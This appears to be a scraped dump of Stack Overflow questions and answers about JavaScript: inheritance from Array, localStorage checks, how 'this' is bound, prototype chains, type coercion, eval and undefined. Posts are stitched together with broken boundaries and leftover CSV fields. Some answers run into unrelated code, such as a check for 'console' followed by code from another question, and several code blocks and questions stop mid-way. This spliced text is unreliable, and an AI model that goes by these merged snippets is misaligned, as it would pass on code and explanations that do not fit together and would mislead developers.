<p>After attempting to subclass and running into some problems, I found this <a href=""http://dean.edwards.name/weblog/2006/11/hooray/"">Dean Edwards</a> article that indicates doing this with Array objects doesn't work right. It turns out Internet Explorer doesn't handle it properly. But I'm finding other issues as well (only tested in Chrome so far).</p>

<p>Here's some sample code:</p>

<pre><code>/** 
 *  Inherit the prototype methods from one constructor into another 
 *  Borrowed from Google Closure Library 
 */
function inherits(childCtor, parentCtor) {
    function tempCtor() {};
    tempCtor.prototype = parentCtor.prototype;
    childCtor.superClass_ = parentCtor.prototype;
    childCtor.prototype = new tempCtor();
    childCtor.prototype.constructor = childCtor;
},

// Custom class that extends Array class
function CustomArray() {
    Array.apply(this, arguments);
}
inherits(CustomArray,Array);

array = new Array(1,2,3);
custom = new CustomArray(1,2,3);
</code></pre>

<p>Entering the following in Chrome's console gives this output:</p>

<pre><code>&gt; custom
[]
&gt; array
[1, 2, 3]
&gt; custom.toString()
TypeError: Array.prototype.toString is not generic
&gt; array.toString()
""1,2,3""
&gt; custom.slice(1)
[]
&gt; array.slice(1)
[2, 3]
&gt; custom.push(1)
1
&gt; custom.toString()
TypeError: Array.prototype.toString is not generic
&gt; custom
[1]
</code></pre>

<p>Obviously, the objects don't behave the same. Should I give up on this approach, or is there some way to accomplish my goal of <code>myobj instanceof CustomArray</code>?</p>

"<p>How can I check if an item is set in <code>localStorage</code>? Currently I am using</p>

<pre><code>if (!(localStorage.getItem(""infiniteScrollEnabled"") == true || localStorage.getItem(""infiniteScrollEnabled"") == false)) {
    // init variable/set default variable for item
    localStorage.setItem(""infiniteScrollEnabled"", true);
}
</code></pre>
","5445","","<p>The <a href=""http://www.w3.org/TR/webstorage/#dom-storage-getitem""><code>getItem</code></a> method in the WebStorage specification, explicitly returns <code>null</code> is the item does not exist:</p>

<blockquote>
  <p>... If the given key does not exist in the list associated with the object then this method must return null. ...</p>
</blockquote>

<p>So, you can:</p>

<pre><code>if (localStorage.getItem(""infiniteScrollEnabled"") === null) {
  //...
}
</code></pre>

<p><strong>Note:</strong> While the WebStorage specification by definition allows you to store any arbitrary JavaScript object as the value of an storage item, this is <em>not implemented</em> yet on any browser (Bug reports: <a href=""https://bugzilla.mozilla.org/show_bug.cgi?id=538142"">Firefox</a>, <a href=""http://code.google.com/p/chromium/issues/detail?id=31394"">Chromium</a>), the storage item values are type-converted to string.</p>

<p>This can give you problems, like in your example, if you store a Boolean value, it will be converted to string, for example:</p>

<pre><code>localStorage.setItem('test', true);
localStorage.getItem('test') == true; // false!!!
</code></pre>

<p>That happens because we are comparing a String with a Boolean value:</p>

<pre><code>""true"" == true; // false
""false"" == false; // false
</code></pre>

<p>Also, if you try to store an object, it will be also converted to String.</p>

","5445","","<p>You have to check if the <code>console</code> identifier is available, you can do it either by using the <code>typeof</code> operator, or by checking <code>window.console</code>, because if you access directly an identifier and it's not defined, you will get a ReferenceError.</p>

<p>For example:</p>

<pre><code>if (typeof console == ""undefined"") {

    this.onion = 'onion';

    function Beta()
        {
        alert(self.onion);
        }

    Beta();
    }

alpha1 = new Alpha();
// Alerts 'onion'
</code></pre>

<p>it works like I would expect.  After wasting a large portion of my life, can anyone explain why it works like this?</p>
","5445","","<p>Works like this because each function has associated its own <em>execution context</em>.</p>

<p>However there are other ways to do it, for example:</p>

<p>Using <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Function/call"" rel=""nofollow""><code>call</code></a> or <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Function/apply"" rel=""nofollow""><code>apply</code></a> to invoke the function:</p>

<pre><code>function Alpha() {
  this.onion = 'onion';

  function Beta() {
    alert(this.onion);
  }

  Beta.call(this);
}

var alpha1 = new Alpha();
// Alerts 'onion'
</code></pre>

<p>The new ECMAScript 5th Edition Standard, introduces a way to persist the function <em>context</em>, the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_15.3.4.5"" rel=""nofollow""><code>Function.prototype.bind</code></a> method:</p>

<pre><code>function Alpha() {
  this.onion = 'onion';

  var Beta = function () {
    alert(this.onion);
  }.bind(this);

  Beta();
}

var alpha1 = new Alpha();
// Alerts 'onion'
</code></pre>

<p>We can say that the <code>Beta</code> function is <em>bound</em>, and no matter how you invoke it, its <code>this</code> value will be the intact.</p>

<p>This method is not widely supported yet, currently only IE9pre3 includes it, but you can include <a href=""http://stackoverflow.com/questions/2025789/preserving-a-reference-to-this-in-javascript-prototype-functions/2025839#2025839"">an implementation</a> to make it work now.</p>

<p>Now let me elaborate about how <code>this</code> works:</p>

<p>The <code>this</code> value exist on each <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_10.3"" rel=""nofollow"">execution context</a>, and for Function Code is set implicitly when a function call is made, the value is determined depending how the <em>reference</em> if formed.</p>

<p>In your example, when you invoke <code>Beta();</code>, since it is not bound to any object, we can say that the reference has no <em>base object</em>, then, the <code>this</code> value will refer to the global object.</p>

<p>Other case happens when you invoke a function that is bound as a property of an object, for example:</p>

<pre><code>var obj = {
  foo: function () { return this === obj;}
};
obj.foo(); // true
</code></pre>

<p>As you can see, the reference being invoked <code>obj.bar();</code> contains a base object, which is <code>obj</code>, and the <code>this</code> value inside the invoked function will refer to it.</p>

<p><sub><strong>Note</strong>: The <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_8.7"" rel=""nofollow"">reference type</a> is an abstract concept, defined for language implementation purposes you can see the details in the spec.</sub></p>

<p>A third case where the <code>this</code> value is set implicitly is when you use the <code>new</code> operator, it will refer to a newly created object that inherits from its constructor's prototype:</p>

<pre><code>function Foo () {
  return this; // `this` is implicitly returned when a function is called 
}              // with `new`, this line is included only to make it obvious

var foo = new Foo();
foo instanceof Foo; // true
Foo.prototype.isPrototypeOf(foo); // true
</code></pre>

"<p>I want to check in a script if a certain other module is already loaded.</p>

<pre><code>if (ModuleName) {
    // extend this module

<p>But if <code>ModuleName</code> doesn't exist, that <code>throw</code>s.</p>

<p>If I knew what the <code>Global Object</code> was I could use that. </p>

<pre><code>if (window.ModuleName) {
    // extend this module
}
</code></pre>

<p>But since I want my module to work with both browsers and <code>node</code>, <code>rhino</code>, etc., I can't assume <code>window</code>.</p>

<p>As I understand it, this doesn't work in ES 5 with <code>""use strict""</code>;</p>

<pre><code>var MyGLOBAL = (function () {return this;}()); // MyGlobal becomes null
</code></pre>

<p>This will also fail with a thrown exception</p>

<pre><code>var MyGLOBAL = window || GLOBAL
</code></pre>

<p>So it seems like I'm left with </p>

<pre><code>try {
    // Extend ModuleName
} 
catch(ignore) {
}
</code></pre>

<p>None of these cases will pass JSLint.</p>

<p>Am I missing anything?</p>
","5445","","<p>Well, you can use the <code>typeof</code> operator, and if the identifier doesn't exist in any place of the scope chain, it will <em>not</em> throw a <code>ReferenceError</code>, it will just return <code>""undefined""</code>:</p>

<pre><code>if (typeof ModuleName != 'undefined') {
  //...
}
</code></pre>

<p>Remember also that the <code>this</code> value on Global code, refers to the global object, meaning that if your <code>if</code> statement is on the global context, you can simply check <code>this.ModuleName</code>.</p>

<p>About the <code>(function () { return this; }());</code> technique, you are right, on strict mode the <code>this</code> value will simply be <code>undefined</code>.</p>

<p>Under strict mode there are two ways to get a reference to the Global object, no matter where you are:</p>

<ul>
<li><p>Through the <code>Function</code> constructor:</p>

<pre><code>var global = Function('return this')();
</code></pre></li>
</ul>

<p>Functions created with the <code>Function</code> constructor don't inherit the strictness of the caller, they are strict only if they start their body with the <code>'use strict'</code> directive, otherwise they are non-strict.</p>

<p>This method is compatible with any ES3 implementation.</p>

<ul>
<li><p>Through an <em>indirect <code>eval</code> call</em>, for example:</p>

<pre><code>""use strict"";
var get = eval;
var global = get(""this"");
</code></pre></li>
</ul>

<p>The above will work because in ES5, indirect calls to <code>eval</code>, use the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_10.4.1.1"">global environment</a> as both, the variable environment and lexical environment for the eval code.</p>

<p>See details on <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_10.4.2"">Entering Eval Code</a>, Step 1.</p>

<p>But be aware that the last solution will not work on ES3 implementations, because an indirect call to <code>eval</code> on ES3 will use the variable and lexical environments of the caller as the environments for the eval code itself.</p>

<p>And at last, you may find useful to detect if strict mode is supported:</p>

<pre><code>var isStrictSupported = (function () { ""use strict""; return !this; })();

<p>So what's the difference between eval() and window[] ?</p>

<p>Sorry for the newbie question though !</p>

<p>Norman</p>
","5445","","<p>Another point that has not been addressed is that <code>eval</code> will resolve the variable reference using the <em>caller variable environment</em>, for example:</p>

<pre><code>var foo = ""global"";

(function () {
  var foo = ""local"";
  alert(eval(""foo"")); // alerts ""local""
  alert(window[""foo""]); // alerts ""global""
})();
</code></pre>

<p>So as you can see, is not completely equivalent.</p>

<p>If you simply want to reference a <em>global variable</em>, I would recommend you to use the <code>window[prop]</code> approach and avoid surprises.</p>

"<p>I'm new to prototype based languages and have read this question:</p>

<p><a href=""http://stackoverflow.com/questions/2025789/preserving-a-reference-to-this-in-javascript-prototype-functions"">http://stackoverflow.com/questions/2025789/preserving-a-reference-to-this-in-javascript-prototype-functions</a></p>

<p>I'm wondering what value there is, of using a prototype based signature to attach methods to an object.  Why not just attach the method to the object's property in the object's definition?</p>

<p>Second, when using the the prototype signature to define methods on an object, why does the 'this' pointer resolve to the window object inside the function?  This appears to be a design flaw.  If it's not could someone explain, or point me to an explanation regarding why not? </p>

<p>Thank you.</p>

<p>Edit:</p>

<p>This code performs as expected, rendering a message box with the word 'here' inside.</p>

<pre><code>function Obj()
{   
    this.theVar = 'here';
    this.method2 = function(){ alert( this.theVar ); }
}

Obj.prototype.method3 = function(){ this.method2(); }
Obj.prototype.method4 = function(){ this.method3(); }

var obj = new Obj();
obj.method4();
</code></pre>

<p>This code is my AJAX callback, and the 'this' pointer refers to the 'window' object during execution.</p>

<pre><code>Test.prototype.nextCallback = function( response )
{
    if( response.Status != 'SUCCESS' )
        show_message( response.Message, false );
    else
        this.setQuestion( response.Question );
}

Test.prototype.setQuestion = function( question ){ ... }
</code></pre>

<p>The 'this' pointer actually works properly before the AJAX call, but not after.  Is this result because the nextCallback() context is not properly restored after the AJAX call returns and before the callback is called?  Is there a way to remedy this?</p>
","5445","","<p>1- The point of adding members on a constructor's prototype, is behavior reuse.</p>

<p>All object instances that inherit from that prototype, will be able to <em>resolve</em> the member through the <em>prototype chain</em>, also the members are defined only once, not in every instance.</p>

<p>2- This happens because each function has its own execution context (that's where the <code>this</code> value is stored), and the <code>this</code> value is implicitly set when you invoke a function, and if a function reference has no <em>base object</em> (e.g. <code>foo();</code>, vs <code>obj.foo()</code>), the global object will set as the <code>this</code> value inside the invoked method.</p>

<p>See the second part of <a href=""http://stackoverflow.com/questions/3274387/this-object-cant-be-accessed-in-private-javascript-functions-without-a-hack/3274402#3274402"">this answer</a> for more details.</p>

<p><strong>Edit:</strong> After looking your code, seems that you are passing a reference of the <code>nextCallback</code> method as the callback function of some Ajax success event, if it's so, the base object of the reference will be lost, a common approach that can be to use an anonymous function that invokes correctly your method, for example:</p>

<pre><code>var obj = new Test();
//...
someAjaxLib(url, function (data) {
  obj.nextCallback(data); // `this` will refer to obj within nextCallback
});
</code></pre>

<p>Another approach can be to bind a method to its instance within the constructor, keep in mind that the method will be defined as an own property on <em>each object instance</em> you create, it will not be inherited, for example:</p>

<pre><code>function Test() {
  var instance = this; // store reference to the current instance

  this.nextCallback = function( response ) {
    if( response.Status != 'SUCCESS' ) {
      show_message( response.Message, false );
    } else {
      instance.setQuestion( response.Question ); // use the stored reference
    }
  }
}

"<p>Since events bubble up in the DOM, it seems like a change event should be able to reach any container element (e.g. div, table, or ul elements).

"<p>just when I thought I understood something about type conversion in JavaScript, I stumbled with this:</p>

<pre><code>+[]; // 0
Number([]); // 0
</code></pre>

<p>My first thought was that I should get NaN, just like if I try to convert an empty object to number:</p>

<pre><code>+{}; // NaN
Number({}); // NaN
</code></pre>

<p>I have been searching about this for a while without any success...</p>

<p>Can somebody explain me why it gets converted to 0 and not to NaN?</p>

<p>Is this behavior standard?</p>

<p>Thanks.</p>
","5445","","<p>In a brief, there are two key points:</p>

<ul>
<li>The <code>toString</code> method of an empty array returns an empty string.</li>
<li>An empty string <em>coerces</em> to zero using the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_11.4.6"">unary plus operator</a> or the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_15.7.1""><code>Number</code> constructor called as a function</a> (e.g. <code>+"""" === 0;</code>).</li>
</ul>

<p>For example, we can use an object that defines a <code>toString</code> method, and returns an empty string to have an equivalent result:</p>

<pre><code>var obj = { toString: function () { return """";} };
+obj; //  0
Number(obj); // 0
</code></pre>

<p>This behavior is completely standard.</p>

<p>Now the long answer:</p>

<p>Both, the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_11.4.6"">unary plus operator</a> and the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_15.7.1""><code>Number</code> constructor called as a function</a> internally use the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_9.3""><code>ToNumber</code></a> abstract operation.  </p>

<p><code>ToNumber</code> will use two more internal operations, <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_9.1""><code>ToPrimitive</code></a> and <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_9.1""><code>[[DefaultValue]]</code></a>.</p>

<p>When the <code>ToNumber</code> operation is applied to an Object, such the empty array in your example, it calls the <code>ToPrimitive</code> operation, to get a representative primitive value and call <code>ToNumber</code> again using that value <sup>[1]</sup>.</p>

<p>The <code>ToPrimitive</code> operation receive two arguments, a Value (which is your array object), and a hint type, which in this case is ""Number"" since we want to make numeric conversion.</p>

<p><code>ToPrimitive</code> calls the <code>[[DefaultValue]]</code> internal method, also with a ""Number"" hint type.</p>

<p>Now, since the hint type we are using ""Number"", the <code>[[DefaultValue]]</code> internal method now will try to invoke first the <code>valueOf</code> method on the object.</p>

<p>Array objects don't have a specific <code>valueOf</code> method, the method is the one inherited from <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_15.2.4.4""><code>Object.prototype.valueOf</code></a>, and this method simply returns a reference to the <em>object</em> itself.</p>

<p>Since the <code>valueOf</code> method didn't result in a <em>primitive value</em>, now the <code>toString</code> method is invoked, and it produces an empty string (which is a primitive value), then the <code>ToNumber</code> operation will try to do String-Number conversion and it finally end up with <code>0</code>  <sup>[1]</sup>.</p>

<p>But now you might wonder, why an empty string coerces to zero?</p>

<pre><code>+""""; // 0
</code></pre>

<p>There is a complete grammar that is used when the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_9.3.1""><code>ToNumber</code> internal operation is applied to a String type</a>, the <code>StringNumericLiteral</code> production.</p>

<p>It has some differences between a NumericLiteral, and one of those differences is that:</p>

<blockquote>
  <p>A StringNumericLiteral that is empty or contains only white space is converted to +0.</p>
</blockquote>
"
"<p>In JavaScript, all Objects act a bit like hashmaps.  However, the keys to these hashmaps must be strings.  If they're not, they're converted with <code>toString()</code>.  That means:</p>

<pre><code>var a = {foo: 1};
var b = {bar: 2};
var o = {};
o[a] = 100;
o[b];              // 100
JSON.stringify(o); // '{""[object Object]"":100}'
</code></pre>

<p>That is, since the <code>toString()</code> of any plain Object is <code>[object Object]</code>, they all address the same value.</p>

<p>I'd like to create a hashmap where Objects with the same properties and values address the same value, but objects with different properties or values address different values.  That is:</p>

<pre><code>var a = {foo: 1};
var b = {bar: 2, baz: 3};
var c = {baz: 3, bar: 2};
var hash = new Hash();
hash.set(a, 100);
hash.get(b);      // undefined
hash.set(b, 200);
hash.get(b);      // 200
hash.get(c);      // 200
</code></pre>

<p>My first instinct was to use <code>JSON.stringify()</code> to turn objects into strings, but:</p>

<pre><code>var hash = {};
var b = {bar: 2, baz: 3};
var c = {baz: 3, bar: 2};
hash[JSON.stringify(b)] = 100
hash[JSON.stringify(b)] // 100
hash[JSON.stringify(c)] // undefined
JSON.stringify(b)       // '{""bar"":2,""baz"":3}'
JSON.stringify(c)       // '{""baz"":3,""bar"":2}'
</code></pre>

<p>That is, JSON serialization is order-dependent.</p>

<p>Is there a good library or technique to implement a hashmap like this?</p>

<p><strong>Update</strong>:</p>

<p>Equivalently, is there a good hashing function such that:</p>

<pre><code>hash({foo: 1, bar: 2}) == hash({bar: 2, foo: 1})

"<p>I'm trying to use prototype inheritance in Javascript.

","5445","","<p>The <code>this</code> value in the global execution context, refers to the global object, e.g.:</p>

<p>For Function Code, it really depends on how do you invoke the function, for example, the <code>this</code> value is implicitly set when:</p>

<p><strong>Calling a function with no <em>base object</em> reference</strong>:</p>

<pre><code>myFunc();
</code></pre>

<p>The <code>this</code> value will also refer to the global object.</p>

<p><strong>Calling a function bound as a property of an object</strong>:</p>

<pre><code>obj.method();

<p>The <code>this</code> value will refer to <code>obj</code>.</p>

<p><strong>Using the <code>new</code> operator</strong>:</p>

<pre><code>new MyFunc();
</code></pre>

<p>The <code>this</code> value will refer to a newly created object that inherits from <code>MyFunc.prototype</code>.</p>

<p>Also, you can set explicitly that value when you invoke a function, using either the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Function/call""><code>call</code></a> or <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Function/apply""><code>apply</code></a> methods, for example:</p>

<pre><code>function test(arg) {
  alert(this + arg);
}
test.call(""Hello"", "" world!""); // will alert ""Hello World!""
</code></pre>

<p>The difference between <code>call</code> and <code>apply</code> is that with <code>apply</code>, you can pass correctly any number of arguments, using an Array or an <code>arguments</code> object, e.g.:</p>

<pre><code>function sum() {
  var result = 0;
  for (var i = 0; i &lt; arguments.length; i++) {
    result += arguments[i];
  }
  return result;

var args = [1,2,3,4];
sum.apply(null, args); // 10

// equivalent to call
sum(1,2,3,4); // 10

<p>If the first argument value of <code>call</code> or <code>apply</code> is <code>null</code> or <code>undefined</code>, the <code>this</code> value will refer to the global object.</p>

<p>Each function has its own execution context, the <code>this</code> keyword retrieves the value of the current context.</p>

<p>The <code>doStuff</code> identifier and the <code>obj.myMethod</code> property refer to the same function object, but since you are invoking it as a property of an object (<code>obj.myMethod();</code>), the <code>this</code> value inside that function, will refer to <code>obj</code>.</p>

"<p>Trying to understand a little more about Crockford's approach to Prototypical Inheritance whereby he essentially eliminates the constructor, thus eliminating any real possibility for a prototype chain or leveraging the idea of ""super"".</p>

<pre><code>mynamespace.object.create = function( o ) {
    function F(){};
    F.prototype = o;
    return new F();
};
</code></pre>

<p>Is that intentional based on the theory behind prototypical?</p>

<p>The reason I ran into this is I wanted to create a base class with an init method that did some common jquery stuff (these methods are designed for automating creating a jquery plugin from an object a la www.alexsexton.com/?p=51)</p>

<p>As an example, I don't want to repeat this in every one of my init methods
    this.options = $.extend({},this.options,options);</p>

<p>So I wanted to have that in a base init, override the init in my extended objects, and then call this.prototype.init within the override to take care of that repeated stuff.</p>

<p>The object.create piece doesn't seem to let me do that in any way. Am I missing something here?</p>
","5445","","<p>The technique is centered on the prototype chain, this type of inheritance is also known as <em>differential inheritance</em>.</p>

<p>For example:</p>

<pre><code>var obj = {};
var obj1 = Object.create(obj);
var obj2 = Object.create(obj1);
</code></pre>

<p>The prototype chain of <code>obj2</code> looks like this:</p>

<pre>
           --------        --------         ------------------
 obj2 ---> | obj1 | -----> | obj  | -----> | Object.prototype | -----> null
           --------        -------          ------------------
</pre>

<p>The arrow that connects the objects in the above example is the internal <code>[[Prototype]]</code> property, and that forms the prototype chain.</p>

<p>When you try to access a property, for example in <code>obj2</code>, it will be searched along all the objects on the prototype chain until is found, otherwise the property accessor will simply yield <code>undefined</code></p>

<p>The concept of <em>super</em> doesn't really exist, although there are ways to know the <code>[[Prototype]]</code> of an object.</p>

<p>The ECMAScript 5th Edition introduced the <code>Object.getPrototypeOf</code> method, for example:</p>

<pre><code>Object.getPrototypeOf(obj2) === obj1; // true
</code></pre>

<p>However this method is <a href=""http://kangax.github.com/es5-compat-table/"">not widely supported yet</a> (along with the standard <code>Object.create</code>).</p>

<p>Some implementations provide access to an object's <code>[[Prototype]]</code> through the <code>__proto__</code> property, e.g.:</p>

<pre><code>obj2.__proto__ === obj1; // true
</code></pre>

<p>But remember that <code>__proto__</code> is non-standard.</p>

<p>The <code>isPrototypeOf</code> method, part of ECMAScript 3, allows you to know if an object is in the prototype chain of another, e.g.:</p>

<pre><code>obj1.isPrototypeOf(obj2);             // true
obj.isPrototypeOf(obj2);              // true
Object.prototype.isPrototypeOf(obj2); // true
</code></pre>

<p>In conclusion, a property is resolved as soon is found in the prototype chain, and if you want to avoid <code>__proto__</code> and <code>Object.getPrototypeOf</code> (since the first is non-standard and the former is not widely supported yet), I would simply recommend you to prefix your <code>init</code> method in the base object, so it can be accessible from the more specific instances, e.g.:</p>

<pre><code>var base = {
  baseInit: function () { /*...*/ }
};

var specific = Object.create(base);
specific.init = function () {
  //...
  this.baseInit();
  //...
};

specific.init();

What is returned from a custom object constructor?<br>
a)The newly-instantiated object<br>
b)undefined - constructors do not return values<br>
c)Whatever is the return statement<br>
d)Whatever is the return statement; the newly-instantiated object if no return statement  </p>
","5445","","<p>Basically if your constructor returns a <em>primitive value</em>, such as a string, number, boolean, null or undefined, (or you don't return anything which is equivalent to returning <code>undefined</code>), a newly created object that inherits from the constructor's <code>prototype</code> will be returned.</p>

<p>That's the object you have access with the <code>this</code> keyword inside the constructor when called with the <code>new</code> keyword.</p>

<p>For example:</p>

<pre><code>function Test() {
  return 5; // returning a primitive
}

var obj = new Test();
obj == 5; // false
obj instanceof Test; // true, it inherits from Test.prototype
Test.prototype.isPrototypeOf(obj); // true
</code></pre>

<p>But if the returned value is an object reference, that will be the returned value, e.g.:</p>

<pre><code>function Test2() {
  this.foo = """"; // the object referred by `this` will be lost...
  return {foo: 'bar'};
}

var obj = new Test2();
obj.foo; // ""bar""

<ol>
<li>Let <code>obj</code> be a newly created native ECMAScript object.</li>
<li>Set all the internal methods of <code>obj</code> as specified in 8.12.</li>
<li>Set the <code>[[Class]]</code> internal property of <code>obj</code> to <code>""Object""</code>.</li>
<li>Set the <code>[[Extensible]]</code> internal property of <code>obj</code> to <code>true</code>.</li>

  <p>Disallow ++ and --</p>
</blockquote>

<p>Why is it a bad idea to disallow these?

<p>The second one, well I don't understand at all.  Does it want me to do myInt += 1  instead of myInt++ ?</p>

<p>Thanks!</p>
","5445","","<p>I don't agree too much with those rules, instead of discouraging the use of <code>==</code>, I would recommend to <strong>learn</strong> about type coercion.</p>

<p>The primary reason about why Crockford wants to avoid <code>==</code> is that the comparison rules depending on the types of the operands can make this operator <em>non-transitive</em>, for example, if:</p>

<pre><code>A == B AND
B == C
</code></pre>

<p>Doesn't guarantees that:</p>

<pre><code>A == C
</code></pre>

<p>A real example:</p>

<pre><code>'0' == 0; // true
 0 == '';   // true
'0' == ''; // false
</code></pre>

<p>The strict <code>===</code> operator is not really necessary when you compare values of the same type, for example:</p>

<pre><code> if (typeof foo == ""function"") { }
</code></pre>

<p>We compare the result of the <code>typeof</code> operator, which is <em>always</em> a string, with a string literal...</p>

<p>Another example, when you compare something against <code>null</code>, <code>==</code> also compares against <code>undefined</code>, for example:</p>

<pre><code>if (something == null) {}
</code></pre>

<p>VS</p>

<pre><code>if (something === null || typeof something === ""undefined"") {}
</code></pre>

<p>The above two conditions are at the end equivalent, but the first one much more readable, of course if you know about type coercion and how <code>==</code> behaves.</p>

<p>Learning how the <code>==</code> operator works, will help you to wisely decide which to use.</p>

<p><strong>Edit:</strong> For being able to calling just <code>echo();</code> you should persist the <code>this</code> value from the outer function context, there are a lot of ways to do it, for example:</p>

<pre><code>//...
var instance = this; // save the outer `this` value
function echo (){
  console.log(instance.test+instance.val); // use it
}
echo();
//...
</code></pre>

<p>Or</p>

<pre><code>//...
var echo = (function (instance) {
  return function () {
    console.log(instance.test+instance.val);
  };
})(this); // pass the outer `this` value
echo();
//...

"<p>This is probably best explained through some code. I know that in the following example, the <code>this</code> inside the addEvent method is the current element contained in the array <code>elements</code>.    </p>

    testMethod: function() {
        var elements = $$('.elements');

<p>I also know that in the following example, <code>this</code> instead refers to the class <code>testClass</code> because I have utilised the bind method.</p>

    testMethod: function() {
        var elements = $$('.elements');

<p>My question, then, is how do I access both the class and the current element at the same time in addEvent? </p>

<p>Please note that if elements were not an array, this would not be problematic as I could pass elements as a parameter in the bind method. However, as it is an array, I cannot do this as it would simple give me an array of all the elements instead of the current element. Thanks!</p>
","5445","","<p>You can provide an argument event argument to your event handler function, for example:</p>

<pre><code>var TestClass = new Class({
  testMethod: function() {
    var elements = $$('.elements');
    elements.addEvent('click', function(e) {
      console.log(this);     // the object instance
      console.log(e.target); // &lt;--- the HTML element
    }.bind(this));
  }
});
</code></pre>

<p>MooTools will pass a normalized <a href=""http://mootools.net/docs/core/Native/Event"" rel=""nofollow"">event object</a> as the <code>e</code> argument of your event handler function, there you can access the <code>e.target</code> property which will refer to the DOM element that triggered the event.</p>
"
"<p>See <a href=""http://jsfiddle.net/FDhQF/1/"">http://jsfiddle.net/FDhQF/1/</a> for a trivial example.</p>

<p>What's the difference between something being undefined and something not being defined in Javascript? For instance, trying to access a property for an object (effectively, trying to access a variable) that isn't defined will return <code>undefined</code>. But you can also set something <code>= undefined</code>. When you do that, trying to access it still return undefined, but the pointer is still there. An example, as above, is how iterating over an object still goes over the property that you've (re)declared as undefined. It seems like there are two different sorts of undefined. Can anyone shed some light on the situation?</p>
","5445","","<p>Both, accessing a property that isn't defined on an object and a property that contains the primitive <code>undefined</code> value, will return you <code>undefined</code>.</p>

<p>For example:</p>

<pre><code>var obj = {
  a: undefined
};

obj.a; // undefined
obj.b; // undefined
</code></pre>

<p>The difference is that <code>a</code> is an own property, and <code>b</code> isn't:</p>

<pre><code>obj.hasOwnProperty('a'); // true
obj.hasOwnProperty('b'); // false
</code></pre>

<p>In the first case <code>a</code> is an own property, even if it contains <code>undefined</code> as its value. In the second case, <code>b</code> is not an own property, accessing <code>obj.b</code> will look for a property named <code>b</code>, all way up in the prototype chain.</p>

<p>When the prototype chain ends (when it reaches an object with a <code>null</code> <code>[[Prototype]]</code>), the property lookup ends and <code>undefined</code> is explicitly returned.</p>

<p>You should know that the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Object/hasOwnProperty""><code>hasOwnProperty</code></a> method checks only if the property physically exist on the object (<em>own</em> properties), but we have also <em>inherited</em> properties, for that case we can use the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Operators/Special_Operators/in_Operator""><code>in</code> operator</a>, for example:</p>

<pre><code>function Test () {}
Test.prototype.a = 'foo'; // instances of Test will inherit from Test.prototype

var obj = new Test(); // { a=""foo"",  b=""bar""}
obj.b = 'bar';

obj.hasOwnProperty('a');  // false
'a' in obj;               // true
obj.a;                    // 'foo'

obj.hasOwnProperty('b');  // true
</code></pre>

<p>As you can see, <code>obj</code> inherits from <code>Test.prototype</code>, and the <code>a</code> property is not an <em>own property</em>, but it is available through the prototype chain. That's why <code>hasOwnProperty</code> returns <code>false</code> and the <code>in</code> operator returns <code>true</code>.</p>

<p>You can see how internally properties are resolved by the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Object/hasOwnProperty""><code>[[Get]]</code></a> internal operation</p>

<p><strong>Notes:</strong></p>

<ul>
<li>Accessing <code>undefined</code> as an identifier is not considered to be safe on ECMAScript 3 (the most widely implemented version of the language standard), because instead of being a language keyword (such as <code>null</code> for example) is just a property of the global object, and it is writable on this version of the Spec., meaning that if someone replaces its value (e.g. <code>window.undefined = 'LOL';</code>) , it will break your code.</li>
</ul>

<p>The <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Operators/Special_Operators/typeof_Operator""><code>typeof</code> operator</a> as @strager mentions can be used instead, for example:</p>

<pre><code>if (typeof obj.prop == 'undefined') { /*....*/ }
</code></pre>

<p>This operator returns always a string (it's safe to use <code>==</code> :), and its value depends of the type of its operand, the possible values are described <a href=""http://bclary.com/2004/11/07/#a-11.4.3"">here</a>.</p>

<p>Another common way to solve this is to declare your own <code>undefined</code> variable, available on the scope of your functions, for example, some libraries use the following pattern:</p>

<pre><code>(function(undefined) {
  // code here
})();
</code></pre>

<p>The function has an argument named <code>undefined</code>, and it is executed immediately without passing any value to it (the last pair or parens make the invocation).</p>

<p>Maybe is worth mentioning that the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_15.1.1.3""><code>undefined</code> global property</a> was finally described on ECMAScript 5 as non-writable (immutable, as well non-enumerable and non-configurable -non deletable-).</p>

<ul>
<li><p>Using the <code>hasOwnProperty</code> method directly from an object instance is also not considered as <em>safe</em>, because if some object has a property with the same name, the original method will be shadowed. For example:</p>

<pre><code>var obj = { hasOwnProperty: function () { /* evil code :) */ } };
</code></pre></li>
</ul>

<p>If you call:</p>

<pre><code>    obj.hasOwnProperty('prop'); 
</code></pre>

<p>The method defined on the object will be executed (and you wouldn't want this since you know exactly which method you want to invoke...), because it <em>shadows</em> the one from the <code>Object.prototype</code>, however it can be safely invoked by:</p>

<pre><code>    Object.prototype.hasOwnProperty.call(obj, 'prop');
</code></pre>

"<p><em>Why</em> can't you access scoped variables using <code>eval</code> under a <code>with</code> statement?</p>

<p>If anyone was wondering what abomination I was trying to come up with that would require both the ""evil"" <code>eval</code> and <code>with</code> -- I was trying to see if I could get a function (used as a callback) executed in another context rather than the one it was defined in.

","5445","","<p>This is a bug reproducible only from the WebKit's Console, it has problems binding the caller context when <code>eval</code> is invoked from a <code>FunctionExpression</code>.</p>

<p>When a direct call of <code>eval</code> is made, the evaluated code as you expect should share both the variable environment:</p>

<pre><code>(function (arg) {
  return eval('arg');
})('foo');
// should return 'foo', throws a ReferenceError from the WebKit console
</code></pre>

